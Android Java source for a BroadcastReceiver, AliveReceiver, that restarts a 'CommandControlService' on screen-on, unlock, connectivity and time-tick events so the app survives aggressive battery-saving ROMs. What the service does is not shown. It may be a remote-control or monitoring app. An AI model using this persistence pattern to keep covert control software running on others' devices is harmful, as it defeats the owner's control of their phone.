package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * 🔧 AliveReceiver - Mantém o app vivo em ROMs agressivas (MIUI, ColorOS, EMUI)
 * Recebe eventos do sistema e garante que os serviços estejam rodando
 */
public class AliveReceiver extends BroadcastReceiver {
    
    private static final String TAG = "AliveReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "🔄 Received: " + action);
        
        try {
            // Garante que CommandControlService está rodando
            ensureServiceRunning(context, CommandControlService.class);
            
            // Se tela ligou, tenta reiniciar serviços
            if (Intent.ACTION_SCREEN_ON.equals(action) || 
                Intent.ACTION_USER_PRESENT.equals(action)) {
                Log.d(TAG, "📱 Tela ligada - verificando serviços...");
                ensureServiceRunning(context, CommandControlService.class);
            }
            
            // Connectivity change, Time tick ou Tela ligou - bom momento para garantir serviço ativo
            if ("android.net.conn.CONNECTIVITY_CHANGE".equals(action) ||
                Intent.ACTION_TIME_TICK.equals(action) ||
                Intent.ACTION_SCREEN_ON.equals(action) || 
                Intent.ACTION_USER_PRESENT.equals(action)) {
                Log.d(TAG, "📱 Evento de sistema (" + action + ") - verificando serviços...");
                ensureServiceRunning(context, CommandControlService.class);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro: " + e.getMessage());
        }
    }
    
    private void ensureServiceRunning(Context context, Class<?> serviceClass) {
        try {
            Intent serviceIntent = new Intent(context, serviceClass);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    context.startForegroundService(serviceIntent);
                } catch (Exception e) {
                    Log.e(TAG, "startForegroundService falhou no AliveReceiver, tentando startService: " + e.getMessage());
                    try { context.startService(serviceIntent); } catch (Exception ignored) {}
                }
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar serviço: " + e.getMessage());
        }
    }
}

